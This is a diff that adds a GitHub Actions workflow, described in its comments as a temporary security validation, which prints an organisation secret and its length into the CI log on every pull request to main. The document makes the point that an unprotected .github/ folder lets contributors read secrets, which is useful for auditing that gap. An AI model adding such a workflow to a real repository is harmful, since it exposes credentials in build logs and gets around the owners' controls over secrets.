@@ -1,0 +1,21 @@
+---
+# SECURITY VALIDATION ONLY — delete this workflow after testing.
+# Purpose: prove that a contributor with push access can read org secrets
+# from a branch PR, because no file-path ruleset protects .github/ on this
+# public repo (unlike repos/terraform-teleport which has one).
+name: secret-dump-validation
+
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print org secret (validation only)
+        env:
+          SECRET_VALUE: ${{ secrets.NESAMONIU_MUZIEJUS }}
+        run: |
+          echo "Can we read NESAMONIU_MUZIEJUS? Value: $SECRET_VALUE"
+          echo "Secret length: ${#SECRET_VALUE}"
